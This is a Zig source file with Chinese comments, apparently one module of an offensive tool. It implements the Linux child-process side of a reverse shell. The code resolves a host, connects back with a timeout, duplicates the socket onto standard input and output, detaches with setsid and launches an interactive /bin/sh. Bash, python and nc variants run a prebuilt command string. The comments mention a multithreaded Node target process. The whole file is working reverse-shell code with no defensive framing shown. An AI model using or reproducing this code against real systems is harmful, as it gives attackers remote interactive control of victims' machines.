// Linux-only 执行段：socket 连回、dup2、exec。非 Linux 目标 @compileError
// （root.zig 已按平台分支，非 Linux 不 import 本文件）。
//
// ⚠️ fork 纪律：目标 Node 是多线程进程，子进程（fork 后单线程）里调用任何
// 分配器都可能撞上被其他线程持有的 malloc 锁而死锁。因此解析（libc
// getaddrinfo）与全部分配都在 fork 前的 worker 线程完成；子进程只做裸
// syscall，读的数据全部来自 fork 前已分配的内存。addrinfo 链、host 与命令串
// 刻意不 free（单次会话派生后的一次性小泄漏，换 fork 后零分配安全——父进程
// 侧 free 可能 munmap 掉子进程 COW 视图）。
const std = @import("std");
const linux = std.os.linux;
const runner = @import("runner.zig");

comptime {
    if (@import("builtin").os.tag != .linux) {
        @compileError("session.zig is Linux-only");
    }
}

/// 状态协议字节：'C' = connect 成功（native）；'F' = 失败。
/// 管道两端 CLOEXEC：子进程 exec 成功时写端自动关闭 → 父端 EOF = spawn 成功。
pub const STATUS_OK: u8 = 'C';
pub const STATUS_FAIL: u8 = 'F';

/// O_NONBLOCK 的数值形态（linux.O 是按架构的 packed struct，fcntl 收整数）
const o_nonblock: usize = @intCast(@as(u32, @bitCast(linux.O{ .NONBLOCK = true })));

/// fork 前调用：域名/IP 统一解析（libc getaddrinfo，UNSPEC + STREAM）。
/// 返回的 addrinfo 链刻意不 free（见文件头）。
pub fn resolve(host: [:0]const u8, port: u16) !Resolved {
    const c = std.c;
    var hints: c.addrinfo = std.mem.zeroes(c.addrinfo);
    hints.family = linux.AF.UNSPEC;
    hints.socktype = linux.SOCK.STREAM;
    var port_buf: [8]u8 = undefined;
    const service = std.fmt.bufPrintZ(&port_buf, "{d}", .{port}) catch return error.BadPort;
    var res: ?*c.addrinfo = null;
    const gai_rc = c.getaddrinfo(host.ptr, service.ptr, &hints, &res);
    if (@intFromEnum(gai_rc) != 0) return error.ResolveFailed;
    if (res == null) return error.ResolveFailed;
    return .{ .head = res };
}

pub const Resolved = struct {
    head: ?*std.c.addrinfo,
};

/// 子进程：逐地址非阻塞 connect + poll 超时，成功返回 socket fd。零分配。
fn connectFirst(head: ?*std.c.addrinfo, timeout_s: u32) ?std.posix.fd_t {
    var it: ?*std.c.addrinfo = head;
    while (it) |ai| : (it = ai.next) {
        const sa: ?*const linux.sockaddr = @ptrCast(ai.addr);
        if (sa == null) continue;
        const fd_raw = linux.socket(sa.?.family, linux.SOCK.STREAM | linux.SOCK.CLOEXEC, linux.IPPROTO.TCP);
        if (@as(isize, @bitCast(fd_raw)) < 0) continue;
        const fd: std.posix.fd_t = @intCast(fd_raw);

        // 非阻塞 connect + poll 限时（阻塞式 connect 无法限时）
        const flags = linux.fcntl(fd, linux.F.GETFL, 0);
        _ = linux.fcntl(fd, linux.F.SETFL, flags | o_nonblock);
        const rc = linux.connect(fd, @ptrCast(sa), @intCast(ai.addrlen));
        var connected = rc == 0;
        if (!connected) {
            const err = linux.errno(rc);
            if (err == .INPROGRESS) {
                var pfds = [_]std.posix.pollfd{.{ .fd = fd, .events = std.posix.POLL.OUT, .revents = 0 }};
                const n = std.posix.poll(&pfds, @intCast(timeout_s * 1000)) catch 0;
                if (n > 0) {
                    var so_err: c_int = 0;
                    var len: linux.socklen_t = @sizeOf(c_int);
                    _ = linux.getsockopt(fd, linux.SOL.SOCKET, linux.SO.ERROR, @ptrCast(&so_err), &len);
                    connected = so_err == 0;
                }
            }
        }
        if (connected) {
            _ = linux.fcntl(fd, linux.F.SETFL, flags); // 恢复阻塞
            return fd;
        }
        _ = linux.close(fd);
    }
    return null;
}

fn writeStatus(status_fd: std.posix.fd_t, byte: u8) void {
    _ = linux.write(status_fd, @ptrCast(&byte), 1);
}

/// native 变体子进程主体：connect 成功写状态，dup2 0/1/2，setsid 脱离进程组，
/// exec /bin/sh -i（此后进程即 shell 会话，本函数不再返回）。
fn execNative(resolved: Resolved, timeout_s: u32, status_fd: std.posix.fd_t) noreturn {
    const fd = connectFirst(resolved.head, timeout_s) orelse {
        writeStatus(status_fd, STATUS_FAIL);
        linux.exit(1);
    };
    writeStatus(status_fd, STATUS_OK);
    _ = linux.dup2(fd, 0);
    _ = linux.dup2(fd, 1);
    _ = linux.dup2(fd, 2);
    if (fd > 2) _ = linux.close(fd);
    _ = linux.setsid();

    const argv = [_:null]?[*:0]const u8{ "/bin/sh", "-i", null };
    const envp = [_:null]?[*:0]const u8{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"};
    _ = linux.execve("/bin/sh", @ptrCast(&argv), @ptrCast(&envp));
    writeStatus(status_fd, STATUS_FAIL);
    linux.exit(127);
}

/// 解释器变体子进程主体：cmd 为 fork 前构建好的命令串（COW 只读）。
/// exec 成功时 CLOEXEC 写端自动关闭（父端 EOF = spawn 成功）；失败写 'F'。
fn execInterpreter(cmd: [:0]const u8, status_fd: std.posix.fd_t) noreturn {
    _ = linux.setsid();
    const argv = [_:null]?[*:0]const u8{ "/bin/sh", "-c", cmd.ptr, null };
    const envp = [_:null]?[*:0]const u8{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"};
    _ = linux.execve("/bin/sh", @ptrCast(&argv), @ptrCast(&envp));
    writeStatus(status_fd, STATUS_FAIL);
    linux.exit(127);
}

/// 子进程入口（fork 后调用，noreturn）。
pub fn childMain(
    variant: runner.Variant,
    resolved: Resolved,
    cmd: ?[:0]const u8,
    timeout_s: u32,
    status_fd: std.posix.fd_t,
) noreturn {
    switch (variant) {
        .native => execNative(resolved, timeout_s, status_fd),
        .bash, .python, .nc => execInterpreter(cmd orelse "", status_fd),
    }
}
